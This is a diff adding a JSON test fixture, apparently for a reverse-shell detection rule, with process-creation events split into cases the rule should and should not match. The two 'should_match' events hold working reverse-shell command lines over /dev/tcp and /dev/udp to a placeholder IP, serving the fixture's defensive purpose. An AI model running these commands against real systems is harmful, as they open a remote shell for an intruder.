@@ -1,0 +1,46 @@
+{
+  "should_match": [
+    {
+      "description": "bash interactive reverse shell",
+      "event": {
+        "EventID": 1,
+        "Computer": "web-01",
+        "User": "www-data",
+        "Image": "/usr/bin/bash",
+        "CommandLine": "bash -i >& /dev/tcp/203.0.113.50/4444 0>&1"
+      }
+    },
+    {
+      "description": "UDP variant",
+      "event": {
+        "EventID": 1,
+        "Computer": "web-01",
+        "User": "www-data",
+        "Image": "/usr/bin/sh",
+        "CommandLine": "sh -c 'sh -i >& /dev/udp/203.0.113.50/53 0>&1'"
+      }
+    }
+  ],
+  "should_not_match": [
+    {
+      "description": "redirect to /dev/null",
+      "event": {
+        "EventID": 1,
+        "Computer": "web-01",
+        "User": "root",
+        "Image": "/usr/bin/bash",
+        "CommandLine": "bash -c 'apt-get update > /dev/null 2>&1'"
+      }
+    },
+    {
+      "description": "netcat port check",
+      "event": {
+        "EventID": 1,
+        "Computer": "web-01",
+        "User": "deploy",
+        "Image": "/usr/bin/nc",
+        "CommandLine": "nc -zv db-01 5432"
+      }
+    }
+  ]
+}
